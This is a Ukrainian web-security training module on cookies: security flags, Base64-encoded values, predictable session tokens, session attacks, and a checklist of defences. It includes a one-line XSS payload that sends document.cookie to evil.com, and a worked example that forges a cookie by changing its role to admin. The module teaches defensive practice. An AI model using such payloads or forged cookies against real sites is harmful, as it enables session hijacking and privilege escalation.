Модуль 04 — Інспекція та маніпуляція cookies

Розберися в анатомії cookies, прапорцях безпеки та способах, якими зловмисники експлуатують слабке управління сесіями.

Навіщо існують cookies — проблема пам'яті HTTP

Ось фундаментальна істина про HTTP, яка багатьох дивує: HTTP не має стану. Кожен запит, який надсилає твій браузер, сервер сприймає так, ніби він прийшов від абсолютно незнайомої людини. У сервера немає пам'яті про попередні запити. Він не знає, що ти залогінився 2 секунди тому. Він не знає, що ти поклав щось у кошик. Він не знає, що ти існуєш.

Це, очевидно, проблема. Ти ж не хочеш вводити пароль на кожній сторінці. Тож у 1994 році Лу Монтуллі — 23-річний програміст із Netscape — винайшов cookies, щоб дати HTTP пам'ять. Ідея була простою: сервер надсилає невеликий фрагмент даних (cookie) браузеру, а браузер автоматично надсилає його назад з кожним наступним запитом до цього сервера. Cookie діє як «бейджик», який каже: «Гей, це знову я, людина, яка залогінилася раніше».

Cookies — причина, чому сучасний веб працює. Без них не було б сесій входу, кошиків покупок, чекбоксів «запам'ятай мене», нічого персоналізованого. Вони також причина, чому працюють багато веб-атак — бо cookies надсилаються браузером автоматично, а все, що автоматичне, можна експлуатувати.

Прапорці безпеки детально

Прапорець Secure

Коли встановлений, cookie передається лише через HTTPS-з'єднання. Без нього зловмисник у тій самій мережі може перехопити cookies через HTTP.

Прапорець HttpOnly

Забороняє JavaScript доступ до cookie через document.cookie. Це пом'якшує крадіжку сесій на основі XSS. Без нього:

// XSS payload to steal session cookie
new Image().src = "https://evil.com/steal?c=" + document.cookie;

Атрибут SameSite

  • Strict: Cookie ніколи не надсилається при cross-site запитах (найкращий захист від CSRF)
  • Lax: Надсилається при навігаціях верхнього рівня (лише GET) — типове значення в сучасних браузерах
  • None: Надсилається завжди (вимагає прапорець Secure) — потрібен для сторонніх контекстів

Cookie-значення, закодовані в Base64

Багато додатків кодують значення cookies у Base64 для передачі. Це кодування, а не шифрування — будь-хто може його декодувати:

// Server sets cookie:
Set-Cookie: session=eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9

// Attacker decodes:
atob("eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9")
// → {"user":"guest","role":"user"}

// Attacker modifies and re-encodes:
btoa('{"user":"guest","role":"admin"}')
// → eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ==
Ніколи не довіряй клієнтським даним. Cookies можуть бути вільно змінені користувачем. Завжди валідуй дані сесії на стороні сервера. Використовуй підписані/зашифровані токени (як JWT з належною валідацією) замість звичайного Base64.

Передбачувані токени сесій

Слабкі токени сесій можна передбачити або підібрати:

  • Послідовні числа: session=1001, session=1002
  • На основі часу: session=1711920000
  • Слабкі хеші: MD5 від імені користувача

Безпечні токени повинні бути криптографічно випадковими з ентропією не менше 128 біт.

Атаки на сесії — що хакери роблять з cookies

Cookies — це ключі від королівства. Якщо зловмисник отримає твій session cookie, йому не потрібен твій пароль — він і Є тобою, наскільки це стосується сервера. Ось основні атаки на cookies:

  • Перехоплення сесії (крадіжка cookies): Крадіжка session cookie через XSS (document.cookie), прослуховування мережі (без прапорця Secure) або шкідливе ПЗ. Маючи cookie, зловмисник видає себе за жертву.
  • Фіксація сесії: Зловмисник встановлює відомий session ID перед тим, як жертва залогіниться. Якщо сервер не перегенерує session ID після автентифікації, попередньо встановлений зловмисником cookie стає автентифікованою сесією.
  • Підробка cookies: Якщо дані сесії зберігаються на клієнті (у самому значенні cookie) без належного підпису, зловмисник може змінити їх — замінивши role:user на role:admin.
  • CSRF: Оскільки cookies надсилаються автоматично з кожним запитом, шкідливий сайт може ініціювати запити до іншого сайту, використовуючи session cookie жертви. (Ми детально розглянемо це в модулі 17.)
Чеклист безпечних cookies: Кожен session cookie повинен мати: (1) прапорець Secure (лише HTTPS), (2) прапорець HttpOnly (без доступу з JavaScript), (3) SameSite=Lax або Strict (захист від CSRF), (4) криптографічно випадкове значення з ентропією не менше 128 біт, (5) відповідний час закінчення дії, та (6) зберігання сесії на сервері (не зберігай конфіденційні дані у самому значенні cookie).
